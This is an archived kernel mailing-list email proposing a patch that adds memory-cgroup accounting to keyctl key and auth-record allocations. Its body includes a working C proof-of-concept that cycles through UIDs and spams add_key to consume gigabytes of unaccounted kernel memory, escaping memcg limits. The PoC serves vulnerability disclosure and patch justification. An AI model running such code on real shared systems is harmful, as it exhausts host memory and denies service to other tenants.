Return-Path: <cgroups-owner@vger.kernel.org>
X-Original-To: lists+cgroups@lfdr.de
Delivered-To: lists+cgroups@lfdr.de
Received: from vger.kernel.org (vger.kernel.org [23.128.96.18])
	by mail.lfdr.de (Postfix) with ESMTP id 011C53CD0D2
	for <lists+cgroups@lfdr.de>; Mon, 19 Jul 2021 11:30:33 +0200 (CEST)
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
        id S235530AbhGSItB (ORCPT <rfc822;lists+cgroups@lfdr.de>);
        Mon, 19 Jul 2021 04:49:01 -0400
Received: from lindbergh.monkeyblade.net ([23.128.96.19]:35038 "EHLO
        lindbergh.monkeyblade.net" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
        with ESMTP id S234868AbhGSItB (ORCPT
        <rfc822;cgroups@vger.kernel.org>); Mon, 19 Jul 2021 04:49:01 -0400
Received: from mail-oi1-x234.google.com (mail-oi1-x234.google.com [IPv6:2607:f8b0:4864:20::234])
        by lindbergh.monkeyblade.net (Postfix) with ESMTPS id 3DD8CC061574
        for <cgroups@vger.kernel.org>; Mon, 19 Jul 2021 01:31:05 -0700 (PDT)
Received: by mail-oi1-x234.google.com with SMTP id c197so19986151oib.11
        for <cgroups@vger.kernel.org>; Mon, 19 Jul 2021 02:29:41 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20161025;
        h=from:to:cc:subject:date:message-id;
        bh=K5p2P65+i0AweYuQiub8/5cfx7UmoYj8p7cwzEMV0lA=;
        b=mqvhVWGbyd07WM7+503sKbpv85x3i1UGUD9R4uaoA+lOdh75nu3Iyh7XRPbrDit0ED
         cUJ1W5evqyynyTzM/e/me/MIk4b1n1QGZldsIMjor+iHcvGjV9e3Q2O+lahXAdwG+5bM
         GGof7BwxTVnVor7FeV1Gq3Ytfcuc2nKtyb0gWBR3/+0yMAqPHhx6yD/4wRSplbLwrbHu
         IIOkq2sDJQwhLMhdW6oJo6He/h1fRNJef068oNTRNfBFDnEBWHkA45f5SoqhR7gCqmt4
         X89TnEP64tNr4si2FcuTBg6wjZTHfayl6rRaT6OJPQy8/O7NrkL3rMv1nTbCrF2sMR0a
         2s/A==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20161025;
        h=x-gm-message-state:from:to:cc:subject:date:message-id;
        bh=K5p2P65+i0AweYuQiub8/5cfx7UmoYj8p7cwzEMV0lA=;
        b=DbD3i8xBw6nsVl7YFCgTPxlaKmX5HO2F+InYMA1DCnzo32liK1kCZpF67kDlPLHr8M
         dpAoc/YjluyANYM6IsNO1aX4XGYFATKbi36Y/2YLvHW4vNUfHCAJImaCrzS7fymQTE7D
         Cey0L0Scf33Fz4QtJT478tHudj5SkQRiqX8r+bhiEckI/dMvc0hGRAJuiCTG4DAes1Mj
         v4eq3VoSsHpCYOAf7jr1oznlg/kqszQRHNM+seb6BXt5OPTcqe6kIdzgh03j7yPM8Bjm
         SGVfpdjV29uei7gZrbZ5d1IQLpr0YjAhbVnrGK79cfOC8gXAKPjISjlZdFbhjTJZgTcC
         KIDA==
X-Gm-Message-State: AOAM533Q0vBKm0aspul5Il2fOou5uoQbVbaGzfWQ5k++JQRce77yrQi8
        6SNmfk/9/xAb+lspWJPlSS0N8yzeLlTW3iMPQ3I=
X-Google-Smtp-Source: ABdhPJwKDzS/MakDwUq1pJi6jRa3rOuOd6E5xqWWgYfoMYcnYqsNMbGcM1qinHnnzvdhPSbgulAGDw==
X-Received: by 2002:a17:90b:806:: with SMTP id bk6mr24297010pjb.13.1626682680800;
        Mon, 19 Jul 2021 01:18:00 -0700 (PDT)
Received: from honest-machine-1.localdomain.localdomain (80.251.213.191.16clouds.com. [80.251.213.191])
        by smtp.gmail.com with ESMTPSA id u24sm19373612pfm.156.2021.07.19.01.17.59
        (version=TLS1_2 cipher=ECDHE-ECDSA-AES128-GCM-SHA256 bits=128/128);
        Mon, 19 Jul 2021 01:18:00 -0700 (PDT)
From:   Yutian Yang <nglaive@gmail.com>
To:     shakeelb@google.com, dhowells@redhat.com, jarkko@kernel.org,
        mhocko@kernel.org
Cc:     hannes@cmpxchg.org, vdavydov.dev@gmail.com,
        cgroups@vger.kernel.org, linux-mm@kvack.org, shenwenbo@zju.edu.cn,
        Yutian Yang <nglaive@gmail.com>
Subject: [PATCH] memcg: enable accounting in keyctl subsys
Date:   Mon, 19 Jul 2021 04:17:47 -0400
Message-Id: <1626682667-10771-1-git-send-email-nglaive@gmail.com>
X-Mailer: git-send-email 1.8.3.1
Precedence: bulk
List-ID: <cgroups.vger.kernel.org>
X-Mailing-List: cgroups@vger.kernel.org

This patch enables accounting for key objects and auth record objects.
Allocation of the objects are triggerable by syscalls from userspace.

We have written a PoC to show that the missing-charging objects lead to
breaking memcg limits. The PoC program takes around 2.2GB unaccounted
memory, while it is charged for only 24MB memory usage. We evaluate the
PoC on QEMU x86_64 v5.2.90 + Linux kernel v5.10.19 + Debian buster. All
the limitations including ulimits and sysctl variables are set as default.
Specifically, we set kernel.keys.maxbytes = 20000 and 
kernel.keys.maxkeys = 200.

/*------------------------- POC code ----------------------------*/

#include <asm/unistd.h>
#include <linux/keyctl.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <errno.h>
#include <time.h>

char desc[4000];
void alloc_key_user(int id) {
  int i = 0, times = -1;
  __s32 serial = 0;
  int err = seteuid(id);
  if (err == 0)
    printf("uid allocation success on id %d!\n", id);
  else {
    printf("err reason is %s.\n", strerror(errno));
    return;
  }
  srand(time(0));
  while (serial != -1) {
    ++times;
    for (i = 0; i < 3900; ++i)
      desc[i] = rand()%255 + 1;
    desc[i] = '\0';
    serial = syscall(__NR_add_key, "user", desc, "payload",
      strlen("payload"), KEY_SPEC_SESSION_KEYRING);
  }
  printf("allocation happened %d times.\n", times);
  seteuid(0);
}

int main() {
  int loop_times = 100000;
  int start_uid = 33001;
  for (int i = 0; i < loop_times; ++i) {
    alloc_key_user(i+start_uid);
  }
  while(1);
  return 0;
}

/*-------------------------- end --------------------------------*/

Signed-off-by: Yutian Yang <nglaive@gmail.com>
---
 security/keys/key.c              | 4 ++--
 security/keys/request_key_auth.c | 4 ++--
 2 files changed, 4 insertions(+), 4 deletions(-)

diff --git a/security/keys/key.c b/security/keys/key.c
index e282c6179..925d85c2e 100644
--- a/security/keys/key.c
+++ b/security/keys/key.c
@@ -279,7 +279,7 @@ struct key *key_alloc(struct key_type *type, const char *desc,
 		goto no_memory_2;
 
 	key->index_key.desc_len = desclen;
-	key->index_key.description = kmemdup(desc, desclen + 1, GFP_KERNEL);
+	key->index_key.description = kmemdup(desc, desclen + 1, GFP_KERNEL_ACCOUNT);
 	if (!key->index_key.description)
 		goto no_memory_3;
 	key->index_key.type = type;
@@ -1198,7 +1198,7 @@ void __init key_init(void)
 {
 	/* allocate a slab in which we can store keys */
 	key_jar = kmem_cache_create("key_jar", sizeof(struct key),
-			0, SLAB_HWCACHE_ALIGN|SLAB_PANIC, NULL);
+			0, SLAB_HWCACHE_ALIGN|SLAB_PANIC|SLAB_ACCOUNT, NULL);
 
 	/* add the special key types */
 	list_add_tail(&key_type_keyring.link, &key_types_list);
diff --git a/security/keys/request_key_auth.c b/security/keys/request_key_auth.c
index 41e973500..ed50a100a 100644
--- a/security/keys/request_key_auth.c
+++ b/security/keys/request_key_auth.c
@@ -171,10 +171,10 @@ struct key *request_key_auth_new(struct key *target, const char *op,
 	kenter("%d,", target->serial);
 
 	/* allocate a auth record */
-	rka = kzalloc(sizeof(*rka), GFP_KERNEL);
+	rka = kzalloc(sizeof(*rka), GFP_KERNEL_ACCOUNT);
 	if (!rka)
 		goto error;
-	rka->callout_info = kmemdup(callout_info, callout_len, GFP_KERNEL);
+	rka->callout_info = kmemdup(callout_info, callout_len, GFP_KERNEL_ACCOUNT);
 	if (!rka->callout_info)
 		goto error_free_rka;
 	rka->callout_len = callout_len;
-- 
2.25.1

